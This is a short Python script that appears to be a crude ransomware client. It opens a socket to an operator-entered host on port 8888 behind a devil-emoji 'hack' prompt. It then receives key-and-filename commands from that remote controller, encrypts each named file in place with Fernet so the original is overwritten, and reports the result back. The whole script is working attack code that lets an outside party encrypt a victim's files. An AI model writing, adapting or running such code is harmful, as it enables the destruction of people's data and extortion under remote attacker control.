import socket 
import emoji 
import os

from cryptography.fernet import Fernet

def encrypt_file(key, file_name):
    with open(file_name, 'rb') as f:
        plain_text = f.read()

    cipher_suite = Fernet(key.encode('utf-8'))
    cipher_text = cipher_suite.encrypt(plain_text)

    with open(file_name, 'wb') as f:
        f.write(cipher_text)
        
def main(): 
    os.system("cls")
    host= input((emoji.emojize('h:smiling_imp: ck>', use_aliases=True)))
    port = 8888

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
    s.connect((host,port)) 

    while True: 
        try:
            data = s.recv(1024) 
            
            data = str(data.decode('utf-8'))

            data.split(',')

            key, file_name = data.split(',')

            if file_name is '.__EXIT__.':
                break

            encrypt_file(key, file_name)
            s.send(b'Encryption Successful')
        except (ConnectionAbortedError, ConnectionResetError):
            break
        except:
            s.send(b'Encryption Fail') 
            break
    s.close() 

if __name__ == '__main__': 
    main() 